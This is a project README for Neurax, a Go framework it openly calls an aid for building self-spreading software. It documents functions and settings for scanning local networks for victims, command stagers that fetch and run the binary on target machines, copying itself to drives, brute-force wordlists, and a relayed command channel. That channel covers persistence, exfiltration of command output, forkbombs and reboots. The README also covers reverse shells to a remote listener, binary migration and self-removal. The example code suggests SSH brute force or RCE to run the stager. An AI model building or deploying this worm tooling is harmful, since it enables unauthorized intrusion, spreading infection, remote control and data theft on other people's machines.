
<br></br>
<p align="center">
  <a>
    <img alt="Neurax" title="Neurax" src="neurax.png">
  </a>
</p>
<br></br>
<p align="center"> A framework that aids in creation of self-spreading software</p>

<br></br>
## Requirements
`go get -u github.com/redcode-labs/Coldfire`

`go get -u github.com/yelinaung/go-haikunator`

## New in v. 2.5
- Optional background execution of the binary in command stager (`.StagerBg`)

## New in v. 2.0
- New wordlist mutators + common passwords by country
- Improvised passive scanning
- `.FastScan` option that makes active scans a bit quicker
- Wordlists are created strictly in-memory
- `NeuraxScan()` accepts a callback function instead of channel as an argument.
- `NeuraxScan()` scans in infinite loop with possibility to set interval between each scan of whole subnet/pool of targets
- Reverse-DNS lookup for targets that are not in IP format
- Extraction of target candidates from ARP cache
- Possibility to scan only a selected list of targets + prioritizing specific targets (such as default gateways)
- Possibility to specify interface and timeout when using passive network scan.
- Improved command stager (can be optionally executed with elevated privilleges / multiple times)
- Few changes of options' names
- `NeuraxConfig.` became `N.` (cause it's shorter to type)
- Functions for random memory allocation + binary migration
- Possibility to chain multiple stagers (ex. `wget` + `curl`)
- Volume and complexity of created wordlist can be easily tuned (with options such as `.WordlistExpand`)
- Possibility to set time-to-live of created binary

## Usage
With help of Neurax, Golang binaries can spread on local network without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.



### Example code

```go
package main
import . "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  N.Port = 5555
  N.Stager = "wget"

  //Start a server that exposes the current binary in the background
  go NeuraxServer()
 
  //Copy current binary to all logical drives
  NeuraxDisks()

  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := NeuraxStager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

### List of config entries

<span style="color:#b45e02">Name</span> | <span style="color:#5f1e2d">Description</span> | <span style="color:#aa5502">Default value</span>
--- | --- | ---
N.Stager           | Name of the command stager to use | `random, platform-compatible`
N.StagerSudo       | If true, Linux cmd stagers are executed with elevated privilleges | `false`
N.StagerRetry      | Number of times to re-execute the command stager | `0`
N.Port             | Port to serve on | `6741`
N.Platform         | Platform to target | `detected automatically`
N.Path             | The path under which binary is saved on the host | `random`
N.FileName        | Name under which downloaded binary should be served and then saved | `random`
N.Base64           | Encode the transferred binary in base64 | `false`
N.CommPort        | Port that is used by binaries to communicate with each other | `7777`
N.CommProto       | Protocol for communication between nodes | `"udp"`
N.ReverseListener | Contains `"<host>:<port>"` of remote reverse shell handler | `not specified`
N.ReverseProto    | Protocol to use for reverse connection | `"udp"`
N.ScanRequiredPort    | NeuraxScan() treats host as active only when it has a specific port opened| `none`
N.ScanPassive     | NeuraxScan() detects hosts using passive ARP traffic monitoring | `false`
N.ScanPassiveTimeout     | NeuraxScan() monitors ARP layer this amount of seconds | `50 seconds`
N.ScanPassiveIface     | Interface to use when scanning passively| `default`
N.ScanActiveTimeout     | NeuraxScan() sets this value as timeout for scanned port in each thread | `2 seconds`
N.ScanPassiveAll         | NeuraxScan() captures packets on all found devices | `false`
N.ScanPassiveNoArp | Passive scan doesn't set strict ARP capture filter | `false`
N.ScanFirst       | A slice containing IP addresses to scan first | `[]string{}`
N.ScanFirstOnly | NeuraxScan() scans only hosts specified within `.ScanFirst`| `false`
N.ScanArpCache   | NeuraxScan() scans first the hosts found in local ARP cache. Works only with active scan | `false`
N.ScanCidr             | NeuraxScan() scans this CIDR | `local IP + "\24"`
N.ScanThreads          | Number of threads to use for NeuraxScan() | `10`
N.ScanFullRange       | NeuraxScan() scans all ports of target host to determine if it is active | `from 19 to 300`
N.ScanInterval    | Time interval to sleep before scanning whole subnet again | `"2m"` 
N.ScanHostInterval    | Time interval to sleep before scanning next host in active mode | `"none"` 
N.ScanGatewayFirst | Gateway is the first host scanned when active scan is used | `false`
N.Verbose          | If true, all error messages are printed to STDOUT | `false`
N.Remove           | When any errors occur, binary removes itself from the host | `false`
N.PreventReexec   | If true, when any command matches with those that were already received before, it is not executed | `true`
N.ExfilAddr       | Address to which output of command is sent when `'v'` preamble is present. | `none`
N.WordlistExpand  | NeuraxWordlist() performs non-standard transformations on input words | false
N.WordlistCommon  | Prepend 20 most common passwords to wordlist | `false`
N.WordlistCommonNum | Number of common passwords to use | `all`
N.WordlistCommonCountries| A map[string]int that contains country codes and number of passwords to use| map[string]int
N.WordlistMutators | Mutators to use when `.WordlistExpand` is specified | `{"single_upper", "cyryllic", "encapsule"}`
N.WordlistPermuteNum | Maximum length of permutation generated by NeuraxWordlistPermute()| `2`
N.WordlistPermuteSeparator | A separator character to use for permutations | `"-"`
N.WordlistShuffle | Shuffle generated wordlist before returning it | `false`
N.AllocNum         | This entry defines how many times `NeuraxAlloc()` allocates random memory| `5`
N.Blacklist        | Slice that contains IP addresses that are excluded from any type of scanning | `[]string{}`
N.FastHTTP         | HTTP request in IsHostInfected() is performed using fasthttp library | `false`
N.Debug            | Enable debug messages | `false`

### Finding new targets
Function `NeuraxScan(func(string))` enables detection of active hosts on local network.
It's only argument is a callback function that is called in background for every active host.
Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `N.`

`NeuraxScan()` runs as infinite loop - it scans whole subnet specified by `.Cidr` config entry and when every host is scanned, function sleeps for an interval given in `.ScanInterval`.

### Disks infection
  Neurax binary doesn't have to copy itself using wireless means.
  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
  Copied binary is not executed, but simply resides in it's destination waiting to be run.
  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.

Another function, `NeuraxZIP(num_files int) err` allows to create a randomly named .zip archive containing current binary.
It is saved in current directory, and contains up to `num_files` random files it.

`NeuraxZIPSelf()` simply zips the current binary, creating an archive holding the same name.

### Synchronized command execution
Function `NeuraxOpenComm()` (launched as goroutine) allows binary to receive and execute commands.
It listens on port number specified in `.CommPort` using protocol defined in `.CommProto`.
Field `.CommProto` can be set either to `"tcp"` or `"udp"`.
Commands that are sent to the port used for communication are executed in a blind manner - their output isn't saved anywhere.

An optional preamble can be added before the command string.

Format: `:<preamble_letters> <command>` 

Example command with preamble might look like this: `:ar echo "pwned"`

Following characters can be specified inside preamble:
* `a`  - received command is forwarded to each infected node, but the node that first received the command will not execute it
* `x`  - received command will be executed even if `a` is specified
* `r`  - after receiving the command, binary removes itself from infected host and quits execution
* `k`  - keep preamble when sending command to other nodes
* `s`  - sleep random number of seconds between 1 and 5 before executing command
* `q`  - after command is executed, the machine reboots
* `o`  - command is sent to a single, random node. `a` must be specified
* `v`  - output of executed command is sent to an address specified under `.ExfilAddr`
* `m`  - mechanism that prevents re-execution of commands becomes disabled just for this specific command 
* `l`  - command is executed in infinite loop
* `e`  - command is executed only if the node has elevated privilleges
* `p`  - command becomes persistent and is executed upon each startup
* `d`  - output of executed command is printed to STDOUT for debugging purpose
* `f`  - forkbomb is launched after command was executed
* `!`  - if command was executed with errors and `a` is specified, this command is not forwarded

By default, raw command sent without any preambles is executed by a single node that the command was addressed for.

It is also important to note that when `k` is not present inside preamble, preamble is removed from command right after the first node receives it.

#### Example 1 - preamble is not forwarded to other nodes:

```go
 (1) [TCP_client]    ":ar whoami" -----> [InfectedHost1] 
 (2) [InfectedHost1] "whoami"     -----> [InfectedHostN]
 
    [InfectedHost1] removes itself after command was sent to all infected nodes in (2)
     because "r" was specified in preamble. "x" was not specified, so "whoami" was not executed by [InfectedHost1] 
```
#### Example 2 - preamble is forwarded:

```go
 (1) [TCP_client]    ":akxr whoami"  -----> [InfectedHost1] 
 (2) [InfectedHost1] ":akxr whoami"  -----> [InfectedHostN]
 (n) [InfectedHostN] ":axkr whoami"  -----> ...............
 .................................   -----> ...............

 Both [InfectedHost1] and [InfectedHostN] execute command and they try to send it to another nodes with preamble preserved
```


### Reverse connections
An interactive reverse shell can be established with `NeuraxReverse()`.
It will receive commands from hostname specified inside `.ReverseListener` in a form of `"<host>:<port>"`.
Protocol that is used is defined under `.ReverseProto`
If `NeuraxOpenComm()` was started before calling this function, each command will behave as described in above section.
If it was not, commands will be executed locally.

Note: this function should be also runned as goroutine to prevent blocking caused by infinite loop used for receiving.

### Cleaning up
Whenever `"purge"` command is received by a node, it resends this command to all other nodes, removes itself from host and quits.
This behaviour can be also commenced using `NeuraxPurge()` executed somewhere in the source.

### Wordlist creation
If spread vector of your choice is based on some kind of bruteforce, it is good to have a proper wordlist prepared. 
Storing words in a text-file on client side isn't really effective, so you can mutate a basic wordlist using `NeuraxWordlist(...words) []string`.
To permute a set of given words, use `NeuraxWordlistPermute(..words) []string`

### Setting time-to-live 
If you want your binary to remove itself after given time, use `NeuraxSetTTL()` at the beginnig of your code.
This function should be launched as a goroutine.
For example:

`go NeuraxSetTTL("2m")`

will make the binary run `NeuraxPurgeSelf()` after 2 minutes from initial execution.

### Using multiple stagers at once
If you would like to chain all stagers available for given platform, set `.Stager` to `"chain"`.

### Moving the dropped binary
If you need to copy the binary after initial execution, use `NeuraxMigrate(path string)`.
It will copy the binary under `path`, remove current binary and execute newly migrated one.


## Support this tool
If you like this project and want to see it grow, please consider making a small donation :>

[ >>>>> DONATE <<<<<](https://paypal.me/redcodelabs?locale.x=pl_PL)

## License
This software is under [MIT license](https://en.wikipedia.org/wiki/MIT_License)